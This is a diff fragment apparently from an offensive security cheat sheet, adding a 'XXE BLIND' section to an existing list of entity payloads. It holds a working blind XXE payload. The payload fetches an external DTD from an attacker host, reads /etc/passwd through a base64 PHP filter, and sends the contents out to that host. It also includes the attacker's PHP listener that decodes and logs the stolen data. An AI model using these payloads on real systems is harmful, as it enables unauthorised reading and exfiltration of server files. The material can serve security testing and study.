@@ -93,3 +93,30 @@ RCE
 <!ENTITY joined "%begin;%file;%end;">
 
 ```
+# XXE BLIND
+- Payload
+``` bash
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE email [ 
+  <!ENTITY % remote SYSTEM "http://OUR_IP:8000/xxe.dtd">
+  %remote;
+  %oob;
+]>
+<root>&content;</root>
+
+# dtd
+<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
+<!ENTITY % oob "<!ENTITY content SYSTEM 'http://OUR_IP:8000/?content=%file;'>">
+```
+
+- Environment
+```bash
+cat index.php
+<?php
+if(isset($_GET['content'])){
+    error_log("\n\n" . base64_decode($_GET['content']));
+}
+?>
+#Initialize
+php -S 0.0.0.0:8000
+```
